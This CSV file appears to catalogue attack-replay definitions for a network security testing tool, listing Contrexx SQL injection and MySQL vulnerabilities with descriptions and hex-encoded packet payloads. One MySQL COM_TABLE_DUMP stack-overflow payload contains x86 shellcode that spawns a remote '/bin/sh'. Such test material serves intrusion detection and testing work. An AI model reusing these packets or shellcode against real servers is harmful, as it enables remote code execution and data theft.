XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿Contrexx_SQL_Injection.xml,Contrexx SQL Injection Attack,"This attack takes advantage of a SQL injection flaw in Contrexx.  Contrexx is a Content Management System written in PHP.  This particular attack will attempt to enumerate usernames and passwords.  Contrexx is a web application, and would typically listen over port 80.",HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿Contrexx_SQL_Injection_IPv6.xml,Contrexx SQL Injection Attack (IPv6 Version),"This attack takes advantage of a SQL injection flaw in Contrexx.  Contrexx is a Content Management System written in PHP.  This particular attack will attempt to enumerate usernames and passwords.  Contrexx is a web application, and would typically listen over port 80. (IPv6 Version)",HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿FSC20060502-06_MySQL_Login_Handshake_Information_Disclosure.xml,MySQL Login Handshake Information Disclosure,There exists an information disclosure vulnerability in MySQL database. The vulnerability is due to a flaw in the server component responsible for the login handshake procedure and allows an attacker with anonymous access to the database to read sensitive data stored in the memory of the server. The attacker then may use the acquired information to compromise the server or to facilitate other attack attempts.,Proprietary,TCP,7[[00 00 01 0D A6 03 00 00 00 00 01 08 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ]]AAAAAA[[99 ]]AAA[[99 ]]AAAAAAAAAAs[[00]]
FSC20060502-06_MySQL_Login_Handshake_Information_Disclosure.xml,MySQL Login Handshake Information Disclosure,There exists an information disclosure vulnerability in MySQL database. The vulnerability is due to a flaw in the server component responsible for the login handshake procedure and allows an attacker with anonymous access to the database to read sensitive data stored in the memory of the server. The attacker then may use the acquired information to compromise the server or to facilitate other attack attempts.,Proprietary,TCP,":[[00 00 00 0A ]]5.0.20-debug[[00 ]] [[00 00 00 ]]Q`o.5_]6[[00 ]],[[A2 08 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ]]3>{tS""L<'K($[[00]]"
﻿FSC20060502-06_MySQL_Login_Handshake_Information_Disclosure_IPv6.xml,MySQL Login Handshake Information Disclosure (IPv6 Version),There exists an information disclosure vulnerability in MySQL database. The vulnerability is due to a flaw in the server component responsible for the login handshake procedure and allows an attacker with anonymous access to the database to read sensitive data stored in the memory of the server. The attacker then may use the acquired information to compromise the server or to facilitate other attack attempts. (IPv6 Version),Proprietary/IPv6,TCP,7[[00 00 01 0D A6 03 00 00 00 00 01 08 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ]]AAAAAA[[99 ]]AAA[[99 ]]AAAAAAAAAAs[[00]]
FSC20060502-06_MySQL_Login_Handshake_Information_Disclosure_IPv6.xml,MySQL Login Handshake Information Disclosure (IPv6 Version),There exists an information disclosure vulnerability in MySQL database. The vulnerability is due to a flaw in the server component responsible for the login handshake procedure and allows an attacker with anonymous access to the database to read sensitive data stored in the memory of the server. The attacker then may use the acquired information to compromise the server or to facilitate other attack attempts. (IPv6 Version),Proprietary/IPv6,TCP,":[[00 00 00 0A ]]5.0.20-debug[[00 ]] [[00 00 00 ]]Q`o.5_]6[[00 ]],[[A2 08 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ]]3>{tS""L<'K($[[00]]"
﻿FSC20060502-12_MySQL_COM_TABLE_DUMP_Function_Stack_Overflow.xml,MySQL COM_TABLE_DUMP Function Stack Overflow,A stack buffer overflow vulnerability exists in the MySQL database server product. The flaw is created by improperly implemented boundary checks on incoming user input. An authenticated attacker with limited privileges may exploit this issue to execute arbitrary code on the vulnerable host within the context of the server process.,Proprietary,TCP,>[[00 00 01 05 A2 00 00 00 00 00 ]]@[[08 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ]]testuser[[00 14 01 D9 ]]g[[9A FF ]]e[[F5 F6 D3 D7 F0 87 04 AA 8E ]]j'[[1F 99 D3]]
FSC20060502-12_MySQL_COM_TABLE_DUMP_Function_Stack_Overflow.xml,MySQL COM_TABLE_DUMP Function Stack Overflow,A stack buffer overflow vulnerability exists in the MySQL database server product. The flaw is created by improperly implemented boundary checks on incoming user input. An authenticated attacker with limited privileges may exploit this issue to execute arbitrary code on the vulnerable host within the context of the server process.,Proprietary,TCP,o[[01 00 00 03 ]]select '1234567890_1_12345678jfXj[[01 ]][[[99 ]]RSj[[02 89 E1 CD 80 ]]RCh[[FF 02 0A 93 89 E1 ]]j[[10 ]]QP[[89 E1 89 C6 B0 ]]f[[CD 80 ]]CC[[B0 ]]f[[CD 80 ]]RV[[89 E1 ]]C[[B0 ]]f[[CD 80 89 D9 89 C3 B0 ]]?I[[CD 80 ]]A[[E2 F8 ]]Rhn/shh//bi[[89 E3 ]]RS[[89 E1 B0 0B CD 80 ]]234567890j[[0B ]]X[[99 ]]Rhn/shh//bi[[89 E3 ]]RS[[89 E1 CD 80 ]]BCDEFGHILMNOPQRSTUVZ_c[[F4 01 00 00 00 00 00 ]]H[[F5 01 00 A0 E9 FF BF A0 E9 ]]l[[BF ]]mmnn[[FF ]]oppqqrrssttuuvvzz_============================================================================================================================================================'
FSC20060502-12_MySQL_COM_TABLE_DUMP_Function_Stack_Overflow.xml,MySQL COM_TABLE_DUMP Function Stack Overflow,A stack buffer overflow vulnerability exists in the MySQL database server product. The flaw is created by improperly implemented boundary checks on incoming user input. An authenticated attacker with limited privileges may exploit this issue to execute arbitrary code on the vulnerable host within the context of the server process.,Proprietary,TCP,"7[[00 00 00 0A ]]5.0.20-nt[[00 ]]#[[00 00 00 ]]//;zvbha[[00 ]],[[A2 08 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ]]2rh5k@<KF\{v[[00]]"
FSC20060502-12_MySQL_COM_TABLE_DUMP_Function_Stack_Overflow.xml,MySQL COM_TABLE_DUMP Function Stack Overflow,A stack buffer overflow vulnerability exists in the MySQL database server product. The flaw is created by improperly implemented boundary checks on incoming user input. An authenticated attacker with limited privileges may exploit this issue to execute arbitrary code on the vulnerable host within the context of the server process.,Proprietary,TCP,[[07 00 00 02 00 00 00 02 00 00 00]]
